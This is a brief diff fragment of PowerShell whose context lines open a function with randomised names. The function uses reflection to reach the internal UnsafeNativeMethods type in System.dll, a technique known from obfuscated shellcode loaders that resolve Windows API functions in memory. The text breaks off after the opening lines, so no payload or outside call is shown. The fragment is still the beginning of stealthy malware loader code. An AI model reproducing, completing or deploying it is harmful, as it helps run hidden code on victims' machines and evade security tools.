@@ -1,3 +1,4 @@
+
 function vc5eok5YhDzy {
 	Param ($aI5mZ91MCxC3, $mwmpw)		
 	$vrwB3BGpck = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
